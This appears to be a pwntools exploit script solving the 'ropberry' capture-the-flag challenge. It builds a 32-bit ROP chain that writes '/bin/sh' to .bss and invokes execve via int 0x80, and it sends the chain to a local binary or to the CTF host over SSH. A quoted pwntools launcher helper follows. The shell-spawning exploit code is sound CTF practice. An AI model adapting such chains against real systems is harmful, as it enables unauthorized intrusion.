from pwn import *
def main():
	offset = 8 # or 12
	pop_eax = 0x080c1906 # pop eax; ret; 
	pop_edx = 0x0805957a #: pop edx; ret; 
	# 0x08084cd0: mov edx, 1; mov eax, esi; mov ecx, 0x81; int 0x80; 
	mov_edx_eax = 0x0808e22d # mov dword ptr [edx], eax; ret; 
	pop_ecx_ebx = 0x080595a1 # pop ecx; pop ebx; ret; 
	int_80 = 0x080493e9 # int 0x80; 

	bss = 0x080eeca0

	# stage 1
	p = "A" * 8
	p += p32(pop_eax)
	p += "/bin"
	p += p32(pop_edx)
	p += p32(bss)
	p += p32(mov_edx_eax)

	# stage 2
	p += p32(pop_eax)
	p += "/sh\x00"
	p += p32(pop_edx)
	p += p32(bss+4)
	p += p32(mov_edx_eax)


	# finalize
	p += p32(pop_eax)
	p += p32(11)
	p += p32(pop_ecx_ebx)
	p += p32(0)
	p += p32(bss)
	p += p32(pop_edx)
	p += p32(0)
	p += p32(int_80)
	print p
	context.log_level='DEBUG'
	if len(sys.argv) > 1:
		context(arch="amd64",os="linux")
		l = listen()
		# ssh -i <your_keyfile> -p 2226 user@ropberry.ctf.insecurity-insa.fr
		r = ssh(host="ropberry.ctf.insecurity-insa.fr", port=2226 ,  user="user", keyfile="/home/tripoloski/.ssh/id_inshack")
		#x = r.connect_remote(r.host , 2226)
		x = r.run('/bin/sh', env={'PS1':''})
	else:
		x = process("./ropberry")

	x.recvuntil("> Ok, now give me the name of our president.\n")
	x.sendline(p)
	x.interactive()

if __name__ == '__main__':
	main()

'''
 #!/usr/bin/env python2
    import os, sys, ctypes, resource, platform, stat
    from collections import OrderedDict
    exe   = 'true'
    argv  = ['true']
    env   = None
    
    os.chdir('.')
    
    if env is not None:
        os.environ.clear()
        os.environ.update(env)
    else:
        env = os.environ
    
    def is_exe(path):
        return os.path.isfile(path) and os.access(path, os.X_OK)
    
    PATH = os.environ.get('PATH','').split(os.pathsep)
    
    if os.path.sep not in exe and not is_exe(exe):
        for path in PATH:
            test_path = os.path.join(path, exe)
            if is_exe(test_path):
                exe = test_path
                break
    
    if not is_exe(exe):
        sys.stderr.write('3\n')
        sys.stderr.write("{} is not executable or does not exist in $PATH: {}".format(exe,PATH))
        sys.exit(-1)
    
    if not True:
        PR_SET_NO_NEW_PRIVS = 38
        result = ctypes.CDLL('libc.so.6').prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
    
        if result != 0:
            sys.stdout.write('3\n')
            sys.stdout.write("Could not disable setuid: prctl(PR_SET_NO_NEW_PRIVS) failed")
            sys.exit(-1)
    
    try:
        PR_SET_PTRACER = 0x59616d61
        PR_SET_PTRACER_ANY = -1
        ctypes.CDLL('libc.so.6').prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY, 0, 0, 0)
    except Exception:
        pass
    
    # Determine what UID the process will execute as
    # This is used for locating apport core dumps
    suid = os.getuid()
    sgid = os.getgid()
    st = os.stat(exe)
    if True:
        if (st.st_mode & stat.S_ISUID):
            suid = st.st_uid
        if (st.st_mode & stat.S_ISGID):
            sgid = st.st_gid
    
    if sys.argv[-1] == 'check':
        sys.stdout.write("1\n")
        sys.stdout.write(str(os.getpid()) + "\n")
        sys.stdout.write(str(os.getuid()) + "\n")
        sys.stdout.write(str(os.getgid()) + "\n")
        sys.stdout.write(str(suid) + "\n")
        sys.stdout.write(str(sgid) + "\n")
        sys.stdout.write(os.path.realpath(exe) + '\x00')
        sys.stdout.flush()
    
    for fd, newfd in {0: 0, 1: 1, 2:2}.items():
        if newfd is None:
            close(fd)
        elif isinstance(newfd, str):
            os.close(fd)
            os.open(newfd, os.O_RDONLY if fd == 0 else (os.O_RDWR|os.O_CREAT))
        elif isinstance(newfd, int) and newfd != fd:
            os.dup2(fd, newfd)
    
    if not True:
        if platform.system().lower() == 'linux' and True is not True:
            ADDR_NO_RANDOMIZE = 0x0040000
            ctypes.CDLL('libc.so.6').personality(ADDR_NO_RANDOMIZE)
    
        resource.setrlimit(resource.RLIMIT_STACK, (-1, -1))
    
    # Attempt to dump ALL core file regions
    try:
        with open('/proc/self/coredump_filter', 'w') as core_filter:
            core_filter.write('0x3f\n')
    except Exception:
        pass
    
    # Assume that the user would prefer to have core dumps.
    try:
        resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))
    except Exception:
        pass
    
    def preexec():
                import platform
                print('\n'.join(platform.uname()))
    apply(preexec, [])
    
    os.execve(exe, argv, env)

'''
